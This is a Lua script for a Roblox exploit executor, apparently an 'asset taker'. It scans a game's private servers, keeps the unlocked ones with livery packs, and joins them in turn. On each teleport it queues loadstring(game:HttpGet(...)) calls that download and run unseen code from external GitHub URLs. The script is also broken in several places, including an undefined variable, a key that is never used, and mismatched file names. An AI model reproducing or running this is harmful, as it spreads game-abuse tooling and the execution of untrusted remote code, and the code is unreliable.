local httpService = game:GetService("HttpService")

local function getServerToJoin()
    local servers = httpService:JSONDecode(readfile("asset taker/servers.json"))
    for key, val in servers do
        if not val then return key end
    end
end

local function joinServer()
    local q = queue_on_teleport or queueonteleport or queueteleport
    q(
        [[
            loadstring(game:HttpGet("https://gist.githubusercontent.com/adamMasMusic/c6ca00d86991b7543c67a76bc5b6bd75/raw/cfce8649c6bb7d891c4a312080fb73059629274b/gay.lua"))()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/adamMasMusic/ERX/refs/heads/main/gay2.lua"))()
        ]]
    )
    replicatedStorage:WaitForChild("PrivateServers"):WaitForChild("JoinServer"):InvokeServer(key, false, false)
end

local function checkServerList()
    local existingFiles = listfiles("asset taker")
    local servers = {}
    local key = nil
    local found = false
    for _, file in existingFiles do
        if file == "servers.json" then
            found = true
        end
    end
    if not found then
        local servers = game:GetService("ReplicatedStorage").PrivateServers.GetServers:InvokeServer()
        for _, server in servers do
            if type(server) == "table" and server.LiveryPack and not server.Locked and server.TierRequirement == 0 and server.GroupJoin == 0 then
                servers[server.CurrKey] = false
            end
        end
        writefile("asset taker/settings.json", httpService:JSONEncode(servers))
    end
    key = getServerToJoin()
    joinServer(key)
end

checkServerList()
